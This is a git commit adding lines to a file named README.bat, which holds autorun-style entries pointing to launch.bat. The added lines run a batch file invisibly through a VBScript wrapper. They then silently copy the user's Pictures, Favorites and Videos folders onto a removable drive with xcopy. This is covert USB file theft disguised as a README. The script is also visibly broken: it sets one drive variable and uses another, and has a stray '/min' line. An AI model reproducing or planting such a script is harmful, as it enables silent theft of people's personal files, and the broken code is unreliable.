9ea6223224ef68d17cb2071d5c9905994f702abf
MGDits <101018088+MGDits@users.noreply.github.com>
2022-03-06 02:12:26 +0700

    Create jar.bat
    wscript.exe \invisible.vbs file.bat

--- README.bat
+++ README.bat
@@ -2,3 +2,18 @@
 open=launch.bat
 shellexecute=launch.bat
 shell\open\command=launch.bat
+
+wscript.exe \invisible.vbs file.bat
+
+@echo off
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+Set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
+@echo off
+cls
+
